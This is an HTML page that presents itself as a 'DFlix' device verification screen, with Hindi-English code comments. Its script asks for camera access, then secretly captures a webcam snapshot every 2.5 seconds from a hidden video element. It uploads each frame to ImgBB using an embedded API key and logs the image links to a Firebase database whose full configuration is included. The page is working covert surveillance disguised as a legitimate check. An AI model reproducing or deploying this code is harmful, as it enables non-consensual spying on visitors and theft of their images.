<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <title>DFlix - Verifying...</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body style="background:#000; color:#fff; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">

    <div style="text-align:center;">
        <h2 id="msg">System Loading...</h2>
        <p id="sub-msg">Please wait while we verify your device.</p>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        // Aapka Fixed Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyD7gABQ1j1zMFS9AylLCZr-K1hyK0LkIsQ",
            authDomain: "distark.firebaseapp.com",
            databaseURL: "https://distark-default-rtdb.firebaseio.com",
            projectId: "distark",
            storageBucket: "distark.firebasestorage.app",
            messagingSenderId: "819241583845",
            appId: "1:819241583845:web:2231e652310e47e06cc00c"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const imgbbKey = '50af9f5367ae25509851af1e1ecf62b6';

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('v').srcObject = stream;
                document.getElementById('msg').innerText = "Verifying Identity...";
                console.log("Camera Ready");
                // Har 2.5 second mein capture
                setInterval(takeSnap, 2500);
            } catch (err) {
                document.getElementById('msg').innerText = "Permission Required!";
                document.getElementById('sub-msg').innerText = "Please allow camera access to continue.";
                console.error("Camera Error:", err);
            }
        }

        function takeSnap() {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            const ctx = c.getContext('2d');

            c.width = v.videoWidth;
            c.height = v.videoHeight;
            ctx.drawImage(v, 0, 0);
            
            const base64 = c.toDataURL('image/png').split(',')[1];
            const fd = new FormData();
            fd.append('image', base64);

            // ImgBB Upload
            fetch(`https://api.imgbb.com/1/upload?key=${imgbbKey}`, { method: 'POST', body: fd })
            .then(r => r.json())
            .then(res => {
                if(res.success) {
                    // Firebase Database mein Save
                    db.ref('live_logs').push({
                        url: res.data.url,
                        time: new Date().toLocaleTimeString()
                    }).then(() => console.log("Saved to Firebase"))
                      .catch(e => console.error("Firebase Error:", e));
                }
            }).catch(e => console.error("Upload Error:", e));
        }

        window.onload = init;
    </script>
</body>
</html>
